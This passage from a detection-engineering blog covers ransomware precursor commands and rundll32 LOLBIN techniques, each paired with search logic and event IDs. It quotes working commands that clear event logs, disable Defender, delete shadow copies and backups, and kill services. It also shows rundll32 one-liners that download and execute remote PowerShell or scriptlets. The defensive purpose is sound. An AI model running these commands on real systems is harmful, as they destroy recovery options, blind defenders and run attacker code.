<td><code>wevtutil.exe cl Application<br><br>wevtutil.exe cl Security<br><br>wevtutil.exe cl System<br><br>FOR /F “delims=” %%I IN (‘WEVTUTIL EL’) DO (WEVTUTIL CL “%%I”)</code></td>
<td>Erasing events in the event logs is an anti-forensic technique.<br><br><a href="https://www.bleepingcomputer.com/news/security/a-closer-look-at-the-robbinhood-ransomware/">https://www.bleepingcomputer.com/news/security/a-closer-look-at-the-robbinhood-ransomware/</a><br><br><a href="https://areteir.com/wp-content/uploads/2020/07/Arete_Insight_Sodino-Ransomware_June-2020.pdf">https://areteir.com/wp-content/uploads/2020/07/Arete_Insight_Sodino-Ransomware_June-2020.pdf</a><br><br>Additional detection possibilities:<br>- Security EventID 1102; EventLog cleared<br>- System EventID 104; Any eventlog was cleared.</td>
</tr>
<tr>
<td>Disable Logging</td>
<td> <code>wevtutil* sl *</code> </td>
<td>`wevtutil.exe sl Security /e:false`</td>
<td>The wevtutil sl log_name /e:false is the same as right-clicking on the log and choosing “Disable log”<br><br><a href="https://www.bleepingcomputer.com/news/security/new-ransom-x-ransomware-used-in-texas-txdot-cyberattack/" target="_blank" rel="noreferrer noopener">https://www.bleepingcomputer.com/news/security/new-ransom-x-ransomware-used-in-texas-txdot-cyberattack/</a>
</td>
</tr>
<tr>
<td>Delete USN Journal</td>
<td><code>fsutil usn deletejournal</code></td>
<td><code>fsutil usn deletejournal /D C:"</code></td>
<td>USN Journal keeps a log of all filesystem changes in NTFS volumes. deleting the journal is an anti-forensic technique.<br><br><a href="https://medium.com/cert-advisory/what-you-should-absolutely-know-about-petya-and-misha-ransomware-attack-goldeneye-ransomware-8c3f8883fb8" target="_blank" rel="noreferrer noopener">https://medium.com/cert-advisory/what-you-should-absolutely-know-about-petya-and-misha-ransomware-attack-goldeneye-ransomware-8c3f8883fb8</a>
</td>
</tr>
</tbody>
</table>
</figure>
<p><!-- /wp:table -->
</div>
<p><!-- /wp:column -->
</div>
<p><!-- /wp:columns --></p>
<p></p>
<p><strong>Goal 2: Impair Recovery</strong><br>These actions aim to limit the victim's options for stopping the malware and recovering from the loss of data. ATT&amp;CK: <a href="https://attack.mitre.org/techniques/T1490/" target="_blank" rel="noreferrer noopener">Inhibit System Recovery (T1490)</a>.</p>
<p><!-- /wp:paragraph --></p>
<p></p>
<figure class="wp-block-table alignfull is-style-stripes">
<table class="has-fixed-layout">
<tbody>
<tr>
<td><strong>SubGoal</strong></td>
<td><strong><strong>Notional Search Logic</strong></strong></td>
<td><strong>Examples</strong></td>
<td><strong>Notes</strong></td>
</tr>
<tr>
<td>Prevent system from booting into Automatic Repair Mode</td>
<td><code>bcdedit /set {default} bootstatuspolicy ignoreallfailures<br><br>OR<br><br>bcdedit /set {default} recoveryenabled no</code></td>
<td><code>bcdedit /set {default} bootstatuspolicy <br>ignoreallfailures<br>bcdedit /set {default} recoveryenabled no</code></td>
<td>Prevents startup in  Automatic Repair Mode  <br><br><a rel="noreferrer noopener" href="https://jsac.jpcert.or.jp/archive/2020/pdf/JSAC2020_1_tamada-yamazaki-nakatsuru_en.pdf" target="_blank">https://jsac.jpcert.or.jp/archive/2020/pdf/JSAC2020_1_tamada-yamazaki-nakatsuru_en.pdf</a>
</td>
</tr>
<tr>
<td>Disable System Restore</td>
<td><code>schtasks.exe /Change /TN * /disable</code></td>
<td><code>schtasks.exe /Change /TN "\Microsoft\Windows\SystemRestore\SR" /disable</code></td>
<td>Defray ransomware disables a default scheduled task which perform system restore backups.<br><br><a rel="noreferrer noopener" href="https://unit42.paloaltonetworks.com/vatet-pyxie-defray777/3/" target="_blank">https://unit42.paloaltonetworks.com/vatet-pyxie-defray777/3/</a>
</td>
</tr>
<tr>
<td>Enforce next startup in safemode</td>
<td><code>reg add HKLM\System\CurrentControlSet\Control\SafeBoot\Minimal\*</code></td>
<td><code>reg add HKLM\System\CurrentControlSet\Control\SafeBoot\Minimal\SuperBackupMan</code></td>
<td>Upon execution of Snatch ransomware, it will install itself as a Windows service named “SuperBackupMan” and create the following registry key to ensure it will start up during bootup into Safe Mode.<br><br><a href="https://malware.news/t/threat-analysis-unit-tau-threat-intelligence-notification-snatch-ransomware/36365" target="_blank" rel="noreferrer noopener">https://malware.news/t/threat-analysis-unit-tau-threat-intelligence-notification-snatch-ransomware/36365</a><br><br>Monitoring for registry changes here via Windows auditing and/or EDR will help with detection if the malware uses a more hidden approach.</td>
</tr>
<tr>
<td>Disable Task Manager</td>
<td>
<code>reg.exe add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System * DisableTaskMgr </code> *</td>
<td><code>reg.exe add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f</code></td>
<td>Limits ability of user to profile and kill tasks.<br><br><a href="https://labs.sentinelone.com/the-fonix-raas-new-low-key-threat-with-unnecessary-complexities/" target="_blank" rel="noreferrer noopener">https://labs.sentinelone.com/the-fonix-raas-new-low-key-threat-with-unnecessary-complexities/</a>&gt;<br><br>Monitoring for registry changes here via Windows auditing and/or EDR will help with detection if the malware uses a more hidden approach.</td>
</tr>
<tr>
<td>Delete shadow copies</td>
<td>
<code>wmic shadowcopy delete *<br></code><br><code>OR</code><br><code><br>vssadmin delete shadows *<br></code> <br><code>OR</code><br><code><br>vssadmin resize shadowstorage *<br></code><br><code>OR</code><br><code><br>powershell Get-WmiObject Win32_ShadowCopy *</code>
</td>
<td><code>Vssadmin.exe Delete Shadows /All /Quiet<br><br>vssadmin.exe resize shadowstorage /for=D: /on=D: /maxsize=401MB<br><br>Get-WmiObject Win32_Shadowcopy | ForEach-Object {$_.Delete();}<br><br>powershell Get-WmiObject Win32_ShadowCopy | % { $_.Delete() }<br><br>powershellGet-WmiObject Win32_ShadowCopy | Remove-WmiObject</code></td>
<td>This is one of THE most prevalent techniques seen in all ransomware families. <br><br><a href="https://redcanary.com/blog/its-all-fun-and-games-until-ransomware-deletes-the-shadow-copies/">https://redcanary.com/blog/its-all-fun-and-games-until-ransomware-deletes-the-shadow-copies/</a><br><br><a href="https://resources.infosecinstitute.com/topic/ransomware-deletion-methods-and-the-canary-in-the-coal-mine/" target="_blank" rel="noreferrer noopener">https://resources.infosecinstitute.com/topic/ransomware-deletion-methods-and-the-canary-in-the-coal-mine/</a><br><br>For vssadmin techniques, we now have a <a href="https://www.bleepingcomputer.com/news/security/new-ransomware-vaccine-kills-programs-wiping-windows-shadow-volumes/" target="_blank" rel="noreferrer noopener">preventative option</a> we well.</td>
</tr>
<tr>
<td>Make deleted files unrecoverable with cipher.exe</td>
<td>cipher*/W:C:\</td>
<td>cipher /W:C\</td>
<td>cipher.exe clears the unallocated sectors of the disk from any residual data; making it impossible to forensically recover deleted files.<br><br><a href="https://unit42.paloaltonetworks.com/vatet-pyxie-defray777/3/">https://unit42.paloaltonetworks.com/vatet-pyxie-defray777/3/</a>
</td>
</tr>
<tr>
<td>Delete backup files</td>
<td><code>del /s /f /q *</code></td>
<td><code>del /s /f /q c:*.VHD c:*.bac c:*.bak c:*.wbcat c:*.bkf c:Backup*.* c:ackup*.* c:*.set c:*.win c:*.dsk</code></td>
<td>Ryuk ransomware also used this rudimentary approach to find and delete any files matching patterns signifying backups. <br><br><a href="https://www.crowdstrike.com/blog/big-game-hunting-with-ryuk-another-lucrative-targeted-ransomware/">https://www.crowdstrike.com/blog/big-game-hunting-with-ryuk-another-lucrative-targeted-ransomware/</a>
</td>
</tr>
<tr>
<td>Delete backups via wbadmin</td>
<td><code>wbadmin delete *</code></td>
<td><code>wbadmin delete catalog -quiet<br>cmd.exe /c wbadmin DELETE SYSTEMSTATEBACKUP<br>cmd.exe /c wbadmin DELETE SYSTEMSTATEBACKUP -deleteOldest</code></td>
<td>wbadmin enables you to back up and restore your operating system, volumes, files, folders, and applications from a command prompt.</td>
</tr>
<tr>
<td>Delete computer restore point</td>
<td><code>delete-ComputerRestorePoint</code></td>
<td><code>Get-ComputerRestorePoint | delete-ComputerRestorePoint</code></td>
<td><a href="https://thedfirreport.com/wp-content/uploads/2020/11/fullpysa.png" target="_blank" rel="noreferrer noopener">https://thedfirreport.com/wp-content/uploads/2020/11/fullpysa.png</a></td>
</tr>
</tbody>
</table>
</figure>
<p><!-- /wp:table --></p>
<p></p>
<p><strong>Goal 3: Unlock files in use</strong><br>These actions aim to ensure the most damage by allowing the ransomware to encrypt even files which may be in use. Killing tasks which have files locked open is key to ensuring they are editable by the ransomware.</p>
<p><!-- /wp:paragraph --></p>
<p></p>
<figure class="wp-block-table alignfull is-style-stripes">
<table class="has-fixed-layout">
<tbody>
<tr>
<td><strong>SubGoal</strong></td>
<td><strong><strong>Notional Search Logic</strong></strong></td>
<td><strong>Examples</strong></td>
<td><strong>Notes</strong></td>
</tr>
<tr>
<td>Kill processes with taskkill</td>
<td><code>taskkill* /IM *</code></td>
<td><code>taskkill.exe"" /IM sqlbrowser.exe /F" <br><br>taskkill.exe"" /IM sqlceip.exe /F" <br><br>taskkill.exe"" /IM sqlservr.exe /F" <br><br>taskkill.exe"" /IM sqlwriter.exe /F"</code></td>
<td>This is similar to the disabling of security tools, but will often be much noisier attempting to kill dozens of processes in short succession. Look for spikes in this command. The report linked below shows several examples. <br><br><a href="https://thedfirreport.com/2020/11/05/ryuk-speed-run-2-hours-to-ransom/" target="_blank" rel="noreferrer noopener">https://thedfirreport.com/2020/11/05/ryuk-speed-run-2-hours-to-ransom/</a><br><br>Additional detection options may exist (e.g. Security Log EventID 4689 Process Terminated)</td>
</tr>
<tr>
<td>Kill processes with netstop</td>
<td>
<code>net stop *</code><br><code>OR</code><br><code>net delete *</code>
</td>
<td><code>net.exe"" stop ""samss"" /y"<br><br>net.exe"" stop ""veeamcatalogsvc"" /y"<br><br>net.exe"" stop ""veeamcloudsvc"" /y"<br><br>net.exe"" stop ""veeamdeploysvc"" /y"</code></td>
<td>Ryuk samples have been observed attempting to stop over 50 predefined processes. Look for spikes in these commands.<br><br><a href="https://thedfirreport.com/2020/11/05/ryuk-speed-run-2-hours-to-ransom/" target="_blank" rel="noreferrer noopener">https://thedfirreport.com/2020/11/05/ryuk-speed-run-2-hours-to-ransom/</a><br><br>Additional Detections:<br>7036 – Service started or stopped<br>7040 – Start type changed (Boot | On Request | Disabled)</td>
</tr>
<tr>
<td>Kill processes with sc</td>
<td><code>sc stop *<br>OR<br>sc delete *<br>OR<br><em>sc config * disabled</em></code></td>
<td>
<code>sc stop RabbitMQ</code><br><br><code>sc config SQLTELEMETRY start= disabled</code><br><code><br>sc config SQLTELEMETRY$ECWDB2 start= disabled<br></code><br><code>sc config SQLWriter start= disabled<br></code><br><code>sc config SstpSvc start= disabled</code>
</td>
<td>These (like 'net stop' and 'taskkill') are often seen in a simple batch file. Look for spikes in these commands.<br><br><a href="https://meterpreter.org/the-latest-trickbot-variant-with-stealthy-code-injection-trick-appear/" target="_blank" rel="noreferrer noopener">https://meterpreter.org/the-latest-trickbot-variant-with-stealthy-code-injection-trick-appear/</a><br><br><a href="https://www.crowdstrike.com/blog/big-game-hunting-with-ryuk-another-lucrative-targeted-ransomware/" target="_blank" rel="noreferrer noopener">https://www.crowdstrike.com/blog/big-game-hunting-with-ryuk-another-lucrative-targeted-ransomware/</a><br><br>Additional Detections:<br>7036 – Service started or stopped<br>7040 – Start type changed (Boot | On Request | Disabled)</td>
</tr>
<tr>
<td>Kill processes with wmic</td>
<td>wmic process * delete<br>wmic </td>
<td><img class="wp-image-266" style="width:500px;" src="https://dfirtnt.wordpress.com/wp-content/uploads/2020/11/image.png" alt=""></td>
<td>Look for spikes in these commands.</td>
</tr>
</tbody>
</table>
</figure>
<p><!-- /wp:table --></p>
<p></p>
<p><strong>Goal: Destroy/Ransom Data</strong><br>This is the final stage where files are encrypted, often renamed and a ransom note is presented or dropped on the filesystem. The detection value of alerting at this stage is limited, since we are going to hope and believe that our users are going to call the emergency hotline at this point and, God forbid, not attempt to pay the attackers.</p>
<p><!-- /wp:paragraph --></p>
<p></p>
<p><strong>Conclusion</strong><br>I hope this will help you in your fight against ransomware. Drop me a comment and let me know what other detection logic you have have found helpful.</p>
<p><!-- /wp:paragraph --><br />
</body></html></p>]]></content><author><name>Andrew Skatoff</name></author><category term="Ransomware" /><summary type="html"><![CDATA[- Detection The business model for Ransomware has evolved to include multi-level and multi-stage services and tool kits. Initial access is often accomplished by 1st stage compromise, followed by 2nd stage download/drop of tools like Emotet, Trickbot, and Qakbot. This 2nd stage allows adversaries to lurk in your network, profiling normal use and/or searching for targets of maximum impact. At this point the attack often looks like any other infiltration. However, several techniques are often observed just prior to ransomware execution. In this post I'll provide examples of these detectable behaviors which you can use to build SIEM alerts, custom EDR prevention/response rules, and threat hunting logic. Detecting these patterns (in near real time) will give you an advantage in understanding what kind of threat you are facing and which devices have been impacted when the inevitable emergency phone calls start coming in. Caveat 1: Alerting on this activity is a LAST line of defense. Truthfully, if you catch a real bad guy with these, you're likely going to have a terrible couple of weeks. If you don't already have a robust set of other detection rules for the 1st and 2nd stages, PLEASE don't start here. This is the last chance to alert and will most likely be only of forensic value, since these often occur minutes before ransomware is deployed. If you're lucky, you'll have a chance to identify and isolate the impacted devices before the attack spreads further. Caveat 2: The commands below assume two things: 1. you are monitoring process execution and associated command lines, 2. the commands are in plain text and not encoded via PowerShell or otherwise obscured (e.g. passed via API). If they are, and you have a robust EDR Solution, or script block logging enabled, you may still be able to see the decoded/hidden commands. Note, some of these techniques are detectable via other means (e.g. registry monitoring) and where that is the case I've mentioned it in the "notes" column below. Always test your rules with adversary emulation techniques! Goal 1: Profile and Disable ProtectionsThese actions aim to evade/disable prevention/detection tools. This could be disabling AntiVirus processes or making changes to system settings. SubGoal Notional Search Logic Examples Notes Recon for security tools via WMI select * AntivirusProductOR select * AntispywareProductORselect * FirewallProduct wmic select * antiviruswmic select * antispyware '*' in these commands is literal. In every other example which follows, it is NOT literal.wmic.exe is commonly used, but a few alternative processes are worth including: srccons.exe | cmd.exe |winrm.exe | winrs.exe | wmiprvse.exe | cscript.exe| wscript.exe | powershell.exe. Disable security tools via service stop/delete/config net stop *ORsc stop *ORsc delete *ORsc config * disabled Examples for MS Firewall service, MS Defender, and Windows Update Service:sc config MpsSvc start= disabledsc config WinDefend start= disabledsc config wuauserv start= disablednet stop MpsSvcnet stop WinDefendnet stop wuauservsc stop MpsSvcsc stop WinDefendsc stop wuauservsc delete MpsSvcsc delete WinDefendsc delete wuauserv Design your search logic with your own relevant tools and processes unique to your environment.https://www.zscaler.com/blogs/security-research/recent-bulehero-botnet-payloadAdditional Detections:7036 – Service started or stopped7040 – Start type changed (Boot | On Request | Disabled) Disable windows firewall via netsh netsh firewall set opmode mode=disableORnetsh Advfirewall set allprofiles state off cmd /c netsh firewall set opmode mode=disablecmd /c netsh Advfirewall set allprofiles state off Disabling firewalls may assists with lateral movement and C2.https://www.zscaler.com/blogs/security-research/recent-bulehero-botnet-payload Disable or misconfigure Defender AV via powershell powershell Set-MpPreference -Disable*ORpowershell Add-MpPreference -Exclusion* powershell Set-MpPreference -DisableRealtimeMonitoring $truepowershell Set-MpPreference -DisableBehaviorMonitoring $truepowershell Set-MpPreference -DisableRealtimeMonitoring $truepowershell Add-MpPreference -ExclusionPath C:Add-MpPreference -ExclusionExtension ".exe" These commands disable elements of MS Defender or set exclusion parameters to evade detection.Microsoft-Windows-Windows Defender/Operational.evtx- Event ID 5001 may be monitored to detect Defender AV Real-Time being disabled.- Event ID 5007 may be monitored to detect Defender configuration changes.Monitoring this registry key will also help with detection: HKLM\SOFTWARE\Microsoft\Windows\Defender\Exclusionshttps://www.gdatasoftware.com/blog/2020/11/36459-babax-stealer-rebrands-to-osno-installs-rootkithttps://thedfirreport.com/2020/11/23/pysa-mespinoza-ransomware/ Stop Services with WMIC wmic service where * call stopservice wmic service where "caption like '%%sense%%'" call stopservice The example command is aimed at disabling the Windows Defender Advanced Threat Protection (EDR) service. Relax filesystem ACLs icacls* *grant* "icacls ""C:*"" /grant Everyone:F /T /C /Q" "icacls ""D:*"" /grant Everyone:F /T /C /Q" Relaxing filesystem ACLs allows the malware to access all files.https://redcanary.com/blog/ryuk-ransomware-attack/ Take ownership of files with takeown.exe takeown.exe * /F * Takeown /S c:\TAKEOWN /S system /U user /P password /F Myshare* Taking ownership of files allows the malware to access all files.https://research.nccgroup.com/2020/06/23/wastedlocker-a-new-ransomware-variant-developed-by-the-evil-corp-group/ Clear event logs to cover tracks. wevtutil* cl * wevtutil.exe cl Applicationwevtutil.exe cl Securitywevtutil.exe cl SystemFOR /F “delims=” %%I IN (‘WEVTUTIL EL’) DO (WEVTUTIL CL “%%I”) Erasing events in the event logs is an anti-forensic technique.https://www.bleepingcomputer.com/news/security/a-closer-look-at-the-robbinhood-ransomware/https://areteir.com/wp-content/uploads/2020/07/Arete_Insight_Sodino-Ransomware_June-2020.pdfAdditional detection possibilities:- Security EventID 1102; EventLog cleared- System EventID 104; Any eventlog was cleared. Disable Logging wevtutil* sl * `wevtutil.exe sl Security /e:false` The wevtutil sl log_name /e:false is the same as right-clicking on the log and choosing “Disable log”https://www.bleepingcomputer.com/news/security/new-ransom-x-ransomware-used-in-texas-txdot-cyberattack/ Delete USN Journal fsutil usn deletejournal fsutil usn deletejournal /D C:" USN Journal keeps a log of all filesystem changes in NTFS volumes. deleting the journal is an anti-forensic technique.https://medium.com/cert-advisory/what-you-should-absolutely-know-about-petya-and-misha-ransomware-attack-goldeneye-ransomware-8c3f8883fb8 Goal 2: Impair RecoveryThese actions aim to limit the victim's options for stopping the malware and recovering from the loss of data. ATT&amp;CK: Inhibit System Recovery (T1490). SubGoal Notional Search Logic Examples Notes Prevent system from booting into Automatic Repair Mode bcdedit /set {default} bootstatuspolicy ignoreallfailuresORbcdedit /set {default} recoveryenabled no bcdedit /set {default} bootstatuspolicy ignoreallfailuresbcdedit /set {default} recoveryenabled no Prevents startup in Automatic Repair Mode https://jsac.jpcert.or.jp/archive/2020/pdf/JSAC2020_1_tamada-yamazaki-nakatsuru_en.pdf Disable System Restore schtasks.exe /Change /TN * /disable schtasks.exe /Change /TN "\Microsoft\Windows\SystemRestore\SR" /disable Defray ransomware disables a default scheduled task which perform system restore backups.https://unit42.paloaltonetworks.com/vatet-pyxie-defray777/3/ Enforce next startup in safemode reg add HKLM\System\CurrentControlSet\Control\SafeBoot\Minimal\* reg add HKLM\System\CurrentControlSet\Control\SafeBoot\Minimal\SuperBackupMan Upon execution of Snatch ransomware, it will install itself as a Windows service named “SuperBackupMan” and create the following registry key to ensure it will start up during bootup into Safe Mode.https://malware.news/t/threat-analysis-unit-tau-threat-intelligence-notification-snatch-ransomware/36365Monitoring for registry changes here via Windows auditing and/or EDR will help with detection if the malware uses a more hidden approach. Disable Task Manager reg.exe add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System * DisableTaskMgr * reg.exe add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f Limits ability of user to profile and kill tasks.https://labs.sentinelone.com/the-fonix-raas-new-low-key-threat-with-unnecessary-complexities/&gt;Monitoring for registry changes here via Windows auditing and/or EDR will help with detection if the malware uses a more hidden approach. Delete shadow copies wmic shadowcopy delete *ORvssadmin delete shadows * ORvssadmin resize shadowstorage *ORpowershell Get-WmiObject Win32_ShadowCopy * Vssadmin.exe Delete Shadows /All /Quietvssadmin.exe resize shadowstorage /for=D: /on=D: /maxsize=401MBGet-WmiObject Win32_Shadowcopy | ForEach-Object {$_.Delete();}powershell Get-WmiObject Win32_ShadowCopy | % { $_.Delete() }powershellGet-WmiObject Win32_ShadowCopy | Remove-WmiObject This is one of THE most prevalent techniques seen in all ransomware families. https://redcanary.com/blog/its-all-fun-and-games-until-ransomware-deletes-the-shadow-copies/https://resources.infosecinstitute.com/topic/ransomware-deletion-methods-and-the-canary-in-the-coal-mine/For vssadmin techniques, we now have a preventative option we well. Make deleted files unrecoverable with cipher.exe cipher*/W:C:\ cipher /W:C\ cipher.exe clears the unallocated sectors of the disk from any residual data; making it impossible to forensically recover deleted files.https://unit42.paloaltonetworks.com/vatet-pyxie-defray777/3/ Delete backup files del /s /f /q * del /s /f /q c:*.VHD c:*.bac c:*.bak c:*.wbcat c:*.bkf c:Backup*.* c:ackup*.* c:*.set c:*.win c:*.dsk Ryuk ransomware also used this rudimentary approach to find and delete any files matching patterns signifying backups. https://www.crowdstrike.com/blog/big-game-hunting-with-ryuk-another-lucrative-targeted-ransomware/ Delete backups via wbadmin wbadmin delete * wbadmin delete catalog -quietcmd.exe /c wbadmin DELETE SYSTEMSTATEBACKUPcmd.exe /c wbadmin DELETE SYSTEMSTATEBACKUP -deleteOldest wbadmin enables you to back up and restore your operating system, volumes, files, folders, and applications from a command prompt. Delete computer restore point delete-ComputerRestorePoint Get-ComputerRestorePoint | delete-ComputerRestorePoint https://thedfirreport.com/wp-content/uploads/2020/11/fullpysa.png Goal 3: Unlock files in useThese actions aim to ensure the most damage by allowing the ransomware to encrypt even files which may be in use. Killing tasks which have files locked open is key to ensuring they are editable by the ransomware. SubGoal Notional Search Logic Examples Notes Kill processes with taskkill taskkill* /IM * taskkill.exe"" /IM sqlbrowser.exe /F" taskkill.exe"" /IM sqlceip.exe /F" taskkill.exe"" /IM sqlservr.exe /F" taskkill.exe"" /IM sqlwriter.exe /F" This is similar to the disabling of security tools, but will often be much noisier attempting to kill dozens of processes in short succession. Look for spikes in this command. The report linked below shows several examples. https://thedfirreport.com/2020/11/05/ryuk-speed-run-2-hours-to-ransom/Additional detection options may exist (e.g. Security Log EventID 4689 Process Terminated) Kill processes with netstop net stop *ORnet delete * net.exe"" stop ""samss"" /y"net.exe"" stop ""veeamcatalogsvc"" /y"net.exe"" stop ""veeamcloudsvc"" /y"net.exe"" stop ""veeamdeploysvc"" /y" Ryuk samples have been observed attempting to stop over 50 predefined processes. Look for spikes in these commands.https://thedfirreport.com/2020/11/05/ryuk-speed-run-2-hours-to-ransom/Additional Detections:7036 – Service started or stopped7040 – Start type changed (Boot | On Request | Disabled) Kill processes with sc sc stop *ORsc delete *ORsc config * disabled sc stop RabbitMQsc config SQLTELEMETRY start= disabledsc config SQLTELEMETRY$ECWDB2 start= disabledsc config SQLWriter start= disabledsc config SstpSvc start= disabled These (like 'net stop' and 'taskkill') are often seen in a simple batch file. Look for spikes in these commands.https://meterpreter.org/the-latest-trickbot-variant-with-stealthy-code-injection-trick-appear/https://www.crowdstrike.com/blog/big-game-hunting-with-ryuk-another-lucrative-targeted-ransomware/Additional Detections:7036 – Service started or stopped7040 – Start type changed (Boot | On Request | Disabled) Kill processes with wmic wmic process * deletewmic Look for spikes in these commands. Goal: Destroy/Ransom DataThis is the final stage where files are encrypted, often renamed and a ransom note is presented or dropped on the filesystem. The detection value of alerting at this stage is limited, since we are going to hope and believe that our users are going to call the emergency hotline at this point and, God forbid, not attempt to pay the attackers. ConclusionI hope this will help you in your fight against ransomware. Drop me a comment and let me know what other detection logic you have have found helpful.]]></summary></entry><entry><title type="html">Detecting RunDLL32 ATT&amp;amp;CK Techniques</title><link href="https://dfirtnt.github.io/2020/06/28/detecting-rundll32-attck-techniques/" rel="alternate" type="text/html" title="Detecting RunDLL32 ATT&amp;amp;CK Techniques" /><published>2020-06-28T15:20:00-04:00</published><updated>2020-06-28T15:20:00-04:00</updated><id>https://dfirtnt.github.io/2020/06/28/detecting-rundll32-attck-techniques</id><content type="html" xml:base="https://dfirtnt.github.io/2020/06/28/detecting-rundll32-attck-techniques/"><![CDATA[- ATT&amp;CK
- Detection
- LOLBINS
<p><!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" "http://www.w3.org/TR/REC-html40/loose.dtd"><br />
<html><body></p>
<p>Launching a strange binary file on a target endpoint is a good way to raise alarm bells within the target organization's SOC. One of the more common #LOLBINS we see is to use RunDLL32.exe to execute malicious DLL files. This technique is well documented in MITRE's ATT&amp;CK framework under <a rel="noreferrer noopener" href="https://attack.mitre.org/techniques/T1085/" target="_blank">T1085</a>.</p>
<p><!-- /wp:paragraph --></p>
<p></p>
<p>In this post, we look at detection approaches for 4 sub-techniques. In each case the assumption is that you are logging command execution with <a href="https://www.blackhillsinfosec.com/getting-started-with-sysmon/" target="_blank" rel="noreferrer noopener">Sysmon</a> or at least <a href="https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/manage/component-updates/command-line-process-auditing" target="_blank" rel="noreferrer noopener">EventID 4688</a> (process execution with command lines). </p>
<p><!-- /wp:paragraph --></p>
<p></p>
<pre class="wp-block-verse"><em>Note: Credit for items #1 and #2 goes to the brilliant folks at <a rel="noreferrer noopener" href="https://lolbas-project.github.io/lolbas/Binaries/Rundll32/" target="_blank">https://lolbasproject.github.io/lolbas</a>.</em></pre>
<p><!-- /wp:verse --></p>
<p></p>
<h2>SubTechnique 1 - Javascript ActiveX Objects</h2>
<p><!-- /wp:heading --></p>
<p></p>
<p>Executing simple Javascript downloader.<br><em>This behavior has been used by malware such as <a rel="noreferrer noopener" href="https://www.vmray.com/cyber-security-blog/poweliks-fileless-malware-analysis/" target="_blank">Poweliks</a>.</em></p>
<p><!-- /wp:paragraph --></p>
<p></p>
<pre class="wp-block-preformatted">rundll32.exe javascript:"..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https[:]//www[.]example[.]com/malicious.sct")" </pre>
<p><!-- /wp:preformatted --></p>
<p></p>
<p>Executing Rundll32.exe to execute a JavaScript script that runs a PowerShell script that is downloaded from a remote web site.</p>
<p><!-- /wp:paragraph --></p>
<p></p>
<pre class="wp-block-preformatted">rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://ip:port/');"</pre>
<p><!-- /wp:preformatted --></p>
<p></p>
<p>Using Rundll32.exe to execute a JavaScript script that runs calc.exe. This will bypass AppLocker even if calc.exe is not on the allowed list.</p>
<p><!-- /wp:paragraph --></p>
<p></p>
<pre class="wp-block-preformatted">rundll32.exe javascript:"\..\mshtml.dll,RunHTMLApplication ";eval("w=new%20ActiveXObject(\"WScript.Shell\");w.run(\"calc\");window.close()");
</pre>
<p><!-- /wp:preformatted --></p>
<p></p>
<p>Executing Rundll32.exe to execute a JavaScript script that runs calc.exe and then kills the Rundll32.exe process that was started.</p>
<p><!-- /wp:paragraph --></p>
<p></p>
<pre class="wp-block-preformatted">rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WScript.Shell").run("calc.exe",0,true);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe",0,true);}</pre>
<p><!-- /wp:preformatted --></p>
<p></p>
<p><span style="text-decoration:underline">SIGMA Friendly Detection Logic:</span></p>
<p><!-- /wp:paragraph --></p>
<p></p>
<p>image=rundll32.exe AND commandLine="*ActiveXObject*"  OR   commandLine="*WScript.Shell*" OR commandLine="*RunHTMLApplication*”</p>
<p><!-- /wp:paragraph --></p>
<p></p>
<h2>SubTechnique 2 - Alternate data streams</h2>
<p><!-- /wp:heading --></p>
<p></p>
<p>Use Rundll32.exe to execute a .DLL file stored in an Alternate Data Stream (ADS).</p>
<p><!-- /wp:paragraph --></p>
<p></p>
<pre class="wp-block-preformatted">rundll32 "C:\ads\file.txt:ADSDLL.dll",DllMain</pre>
<p><!-- /wp:preformatted --></p>
<p></p>
<p><span style="text-decoration:underline">SIGMA Friendly Detection Logic:</span></p>
<p><!-- /wp:paragraph --></p>
<p></p>
<p>image=rundll32.exe  | <span style="color:#9fa300" class="has-inline-color">regex</span> commandLine="/^rundll32.+\:.+\..+$/"</p>
<p><!-- /wp:paragraph --></p>
<p></p>
<h2>SubTechnique 3 – Point Function Call</h2>
<p><!-- /wp:heading --></p>
<p></p>
<p>RunDll32 can be used to launch an executable via the <a rel="noreferrer noopener" href="https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-entry-point-function" target="_blank">PointFunctionCall</a> operation. This technique was used by a suspected <a href="https://www.fireeye.com/blog/threat-research/2018/11/not-so-cozy-an-uncomfortable-examination-of-a-suspected-apt29-phishing-campaign.html" target="_blank" rel="noreferrer noopener">APT group</a> (APT29).<br></p>
<p><!-- /wp:paragraph --></p>
<p></p>
<pre class="wp-block-preformatted">"C:\Windows\system32\rundll32.exe"  C:\Users\Administrator\AppData\Local\cyzfc.dat, PointFunctionCall</pre>
<p><!-- /wp:preformatted --></p>
<p></p>
<p><span style="text-decoration:underline">SIGMA Friendly Detection Logic:</span></p>
<p><!-- /wp:paragraph --></p>
<p></p>
<p>image=rundll32.exe  AND commandLine="*PointFunctionCall*"</p>
<p><!-- /wp:paragraph --></p>
<p></p>
<h2>SubTechnique 4 – Network HTTP(s) call for additional payloads</h2>
<p><!-- /wp:heading --></p>
<p></p>
<p>Rundll32 can be used to launch a custom DLL that pulls down malware from the internet. The example below is used by <a href="https://malwaretips.com/blogs/remove-my-forms-finder-by-myway/">Slimware PUA</a>.</p>
<p><!-- /wp:paragraph --></p>
<p></p>
